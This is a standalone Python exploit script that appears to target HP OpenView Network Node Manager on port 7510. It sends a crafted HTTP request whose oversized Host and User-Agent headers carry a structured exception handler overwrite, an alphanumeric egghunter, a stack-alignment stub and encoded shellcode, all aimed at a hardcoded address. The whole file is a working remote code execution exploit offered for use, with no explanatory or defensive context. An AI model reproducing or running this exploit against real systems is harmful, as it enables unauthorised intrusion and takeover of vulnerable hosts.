#!/usr/bin/env python

import socket
import os
import sys

host = '192.168.0.89'
port = 7510

'''
0x6d396948 : pop ecx # pop ebp # ret 0x0c | asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [jvm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\HP OpenView\jre\jre1.4\bin\client\jvm.dll)
'''

jbe_overppt = '\x76\x06\x42\x42' # jbe short 0x6
ppt = '\x48\x69\x39\x6d'

hunter =  ""
hunter += "\x54\x58\x05\x50\x1b\x69\x69\x05\x50\x01\x5b\x5b"
hunter += "\x05\x06\x01\x3d\x3b\x50\x5C\x41\x41\x25"
hunter += "\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x21\x55\x55\x55\x2D\x21"
hunter += "\x54\x55\x55\x2D\x49\x6F\x55\x6D\x50\x41\x41\x25\x4A\x4D\x4E\x55"
hunter += "\x25\x35\x32\x31\x2A\x2D\x71\x21\x61\x75\x2D\x71\x21\x61\x75\x2D"
hunter += "\x6F\x47\x53\x65\x50\x41\x41\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31"
hunter += "\x2A\x2D\x44\x41\x7E\x58\x2D\x44\x34\x7E\x58\x2D\x48\x33\x78\x54"
hunter += "\x50\x41\x41\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x71\x7A"
hunter += "\x31\x45\x2D\x31\x7A\x31\x45\x2D\x6F\x52\x48\x45\x50\x41\x41\x25"
hunter += "\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x33\x73\x31\x2D\x2D\x33"
hunter += "\x33\x31\x2D\x2D\x5E\x54\x43\x31\x50\x41\x41\x25\x4A\x4D\x4E\x55"
hunter += "\x25\x35\x32\x31\x2A\x2D\x45\x31\x77\x45\x2D\x45\x31\x47\x45\x2D"
hunter += "\x74\x45\x74\x46\x50\x41\x41\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31"
hunter += "\x2A\x2D\x52\x32\x32\x32\x2D\x31\x31\x31\x31\x2D\x6E\x5A\x4A\x32"
hunter += "\x50\x41\x41\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x31\x2D"
hunter += "\x77\x44\x2D\x31\x2D\x77\x44\x2D\x38\x24\x47\x77\x50"

shellcode =  ""
shellcode += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shellcode += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += "\x42\x75\x4a\x49\x69\x6c\x49\x78\x6b\x32\x47\x70"
shellcode += "\x57\x70\x35\x50\x43\x50\x6c\x49\x6d\x35\x45\x61"
shellcode += "\x79\x50\x71\x74\x6c\x4b\x62\x70\x50\x30\x4e\x6b"
shellcode += "\x50\x52\x46\x6c\x4e\x6b\x53\x62\x32\x34\x4c\x4b"
shellcode += "\x63\x42\x44\x68\x44\x4f\x4c\x77\x53\x7a\x55\x76"
shellcode += "\x30\x31\x79\x6f\x4c\x6c\x45\x6c\x70\x61\x73\x4c"
shellcode += "\x37\x72\x56\x4c\x47\x50\x7a\x61\x68\x4f\x76\x6d"
shellcode += "\x75\x51\x6f\x37\x6b\x52\x7a\x52\x70\x52\x43\x67"
shellcode += "\x4c\x4b\x33\x62\x44\x50\x6e\x6b\x62\x6a\x57\x4c"
shellcode += "\x6c\x4b\x52\x6c\x72\x31\x62\x58\x4d\x33\x42\x68"
shellcode += "\x37\x71\x7a\x71\x46\x31\x6c\x4b\x62\x79\x71\x30"
shellcode += "\x47\x71\x38\x53\x4c\x4b\x52\x69\x56\x78\x69\x73"
shellcode += "\x57\x4a\x30\x49\x6c\x4b\x44\x74\x4e\x6b\x66\x61"
shellcode += "\x6b\x66\x50\x31\x59\x6f\x6e\x4c\x4a\x61\x38\x4f"
shellcode += "\x64\x4d\x33\x31\x49\x57\x55\x68\x59\x70\x33\x45"
shellcode += "\x4a\x56\x65\x53\x53\x4d\x39\x68\x55\x6b\x51\x6d"
shellcode += "\x57\x54\x64\x35\x6b\x54\x42\x78\x4c\x4b\x61\x48"
shellcode += "\x61\x34\x56\x61\x79\x43\x35\x36\x6c\x4b\x54\x4c"
shellcode += "\x52\x6b\x4c\x4b\x42\x78\x55\x4c\x63\x31\x6a\x73"
shellcode += "\x4c\x4b\x46\x64\x4e\x6b\x65\x51\x68\x50\x4f\x79"
shellcode += "\x37\x34\x64\x64\x56\x44\x33\x6b\x71\x4b\x31\x71"
shellcode += "\x53\x69\x31\x4a\x53\x61\x6b\x4f\x79\x70\x63\x6f"
shellcode += "\x31\x4f\x31\x4a\x4e\x6b\x52\x32\x58\x6b\x6e\x6d"
shellcode += "\x33\x6d\x31\x78\x47\x43\x64\x72\x63\x30\x73\x30"
shellcode += "\x73\x58\x44\x37\x53\x43\x56\x52\x43\x6f\x73\x64"
shellcode += "\x30\x68\x42\x6c\x43\x47\x54\x66\x47\x77\x59\x6f"
shellcode += "\x6e\x35\x4c\x78\x7a\x30\x66\x61\x43\x30\x75\x50"
shellcode += "\x71\x39\x49\x54\x30\x54\x52\x70\x51\x78\x46\x49"
shellcode += "\x4b\x30\x50\x6b\x55\x50\x59\x6f\x69\x45\x31\x7a"
shellcode += "\x57\x75\x50\x68\x49\x50\x69\x38\x35\x50\x31\x35"
shellcode += "\x75\x38\x43\x32\x45\x50\x36\x61\x6d\x6b\x6c\x49"
shellcode += "\x59\x76\x66\x30\x36\x30\x72\x70\x32\x70\x77\x30"
shellcode += "\x62\x70\x67\x30\x32\x70\x61\x78\x5a\x4a\x54\x4f"
shellcode += "\x6b\x6f\x49\x70\x69\x6f\x6e\x35\x5a\x37\x32\x4a"
shellcode += "\x72\x30\x53\x66\x76\x37\x33\x58\x5a\x39\x6f\x55"
shellcode += "\x71\x64\x31\x71\x69\x6f\x39\x45\x4d\x55\x49\x50"
shellcode += "\x42\x54\x55\x5a\x49\x6f\x30\x4e\x65\x58\x70\x75"
shellcode += "\x68\x6c\x6a\x48\x70\x61\x35\x50\x73\x30\x55\x50"
shellcode += "\x42\x4a\x67\x70\x72\x4a\x45\x54\x32\x76\x63\x67"
shellcode += "\x63\x58\x56\x62\x6b\x69\x59\x58\x71\x4f\x4b\x4f"
shellcode += "\x5a\x75\x4e\x63\x7a\x58\x47\x70\x51\x6e\x77\x46"
shellcode += "\x6c\x4b\x44\x76\x62\x4a\x33\x70\x53\x58\x53\x30"
shellcode += "\x76\x70\x37\x70\x35\x50\x32\x76\x53\x5a\x75\x50"
shellcode += "\x51\x78\x46\x38\x6e\x44\x76\x33\x4b\x55\x49\x6f"
shellcode += "\x79\x45\x7a\x33\x46\x33\x73\x5a\x65\x50\x43\x66"
shellcode += "\x36\x33\x56\x37\x70\x68\x66\x62\x4e\x39\x59\x58"
shellcode += "\x51\x4f\x69\x6f\x5a\x75\x4f\x73\x79\x68\x37\x70"
shellcode += "\x31\x6d\x31\x32\x30\x58\x65\x38\x57\x70\x77\x30"
shellcode += "\x63\x30\x45\x50\x62\x4a\x35\x50\x66\x30\x50\x68"
shellcode += "\x76\x6b\x44\x6f\x36\x6f\x44\x70\x4b\x4f\x68\x55"
shellcode += "\x50\x57\x53\x58\x72\x55\x42\x4e\x72\x6d\x75\x31"
shellcode += "\x59\x6f\x79\x45\x61\x4e\x43\x6e\x49\x6f\x56\x6c"
shellcode += "\x67\x54\x68\x69\x34\x31\x39\x6f\x69\x6f\x69\x6f"
shellcode += "\x36\x61\x59\x53\x54\x69\x4a\x66\x52\x55\x48\x47"
shellcode += "\x4f\x33\x6f\x4b\x6d\x30\x75\x4d\x34\x6a\x65\x5a"
shellcode += "\x42\x48\x69\x36\x6e\x75\x6d\x6d\x6f\x6d\x39\x6f"
shellcode += "\x4e\x35\x75\x6c\x67\x76\x53\x4c\x65\x5a\x6d\x50"
shellcode += "\x39\x6b\x39\x70\x32\x55\x35\x55\x4f\x4b\x73\x77"
shellcode += "\x74\x53\x63\x42\x52\x4f\x33\x5a\x55\x50\x62\x73"
shellcode += "\x39\x6f\x6b\x65\x41\x41"

'''
02DC1C3C   54               PUSH ESP
02DC1C3D   58               POP EAX
02DC1C3E   2D 3D73660C      SUB EAX,0C66733D
02DC1C43   2D 01710101      SUB EAX,1017101
02DC1C48   50               PUSH EAX
02DC1C49   5C               POP ESP
'''

stackalign = '\x54\x58\x2d\x3d\x73\x66\x0c\x2d\x01\x71\x01\x01\x50\x5c'

stage3 = 'D' * 107 + stackalign + shellcode + 'E' * (2000 - 107 - len(shellcode) - len(stackalign))
stage2 = 'T00WT00W' + '\xe9\x8a\xf8\xff\xff' + '\x46' * 1995
stage1 = 'A' * 3377 + jbe_overppt + ppt + hunter + 'C' * 250

buf = 'GET /topology/homeBaseView HTTP/1.1\r\n'
buf += 'Host: {}:7510\r\n'.format(stage1)
buf += 'Content-Type: application/x-www-form-urlencoded\r\n'
buf += 'User-Agent: {}\r\n\r\n'.format(stage3)
buf += stage2

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buf)
s.close()
